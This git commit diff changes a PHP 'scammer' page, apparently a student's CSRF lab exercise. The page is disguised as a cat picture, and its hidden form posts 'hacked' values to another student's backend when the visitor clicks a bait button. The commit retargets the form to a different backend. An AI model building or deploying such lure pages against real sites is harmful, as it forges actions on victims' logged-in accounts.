3b97353f74f937215e7966c3a564cf1ab61c5390
IlyaMolchanovv <90561936+IlyaMolchanovv@users.noreply.github.com>
2022-05-20 22:02:46 +0300

    Update index.php

--- scammer_page/index.php
+++ scammer_page/index.php
@@ -4,10 +4,10 @@
         <meta charset="utf-8">
         <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
         <meta name="viewport" content="width=device-width">
-        <title>Картинка с котиком :3</title>
+        <title>Всем котиков</title>
     </head>
     <body>
-        <form method="post" action="http://u47569.kubsu-dev.ru/web_backend/task-7/index.php">
+        <form method="post" action="http://u1057.kubsu-dev.ru/backend7/index.php">
             <div class="form-group" style="display:none;">
                     <input type="text" name="name" value="взломан">
                     <input type="text" name="email" value="hacked@mail.ru">
@@ -21,7 +21,7 @@
                     <input type="checkbox" name="contr_check" value="contr_check" checked></p>
             </div>
             <?php if(!empty($_COOKIE[session_name()]) ) print('<p><button type="submit" >Нажми, чтобы погладить!</button></p>');?>
-            <p><img src="https://www.factroom.ru/wp-content/uploads/2017/01/11-38.jpg" width="500px" height="40%"></p>
+            <p><img src="https://www.factroom.ru/wp-content/uploads/2021/12/4-19.jpg" width="500px" height="40%"></p>
         </form>
     </body>
 </html>
